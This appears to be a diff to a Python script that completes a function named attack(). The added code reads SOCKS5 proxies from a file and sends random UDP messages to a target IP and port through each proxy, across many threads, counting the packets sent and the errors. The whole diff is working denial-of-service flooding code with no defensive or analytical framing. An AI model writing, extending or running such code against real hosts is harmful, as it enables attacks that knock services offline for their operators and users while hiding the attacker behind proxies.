@@ -51,9 +51,23 @@ def attack():
 	with open(r"socks5.txt", "r") as file:
 		for line in file:
 			try:
-				pass
+				message = random.choice(messages)
+				
+				sock = socks.socksocket(socket.AF_INET, socket.SOCK_DGRAM)
+				list_pr = line.rsplit(':', 1)
+				
+				ip_pr5 = list_pr[0]
+				port_pr5 = int(list_pr[1])
+				
+				sock.set_proxy(socks.SOCKS5, ip_pr5, port_pr5)
+				sock.sendto(message, (ip, int(port)))
+				
+				sent += 1
+				
+				info_print(sent)
 			except:
-				pass
+				errors += 1
+				info_print(errors)
 			
 for o in range(threads):
 	main_thread = threading.Thread(target = attack)
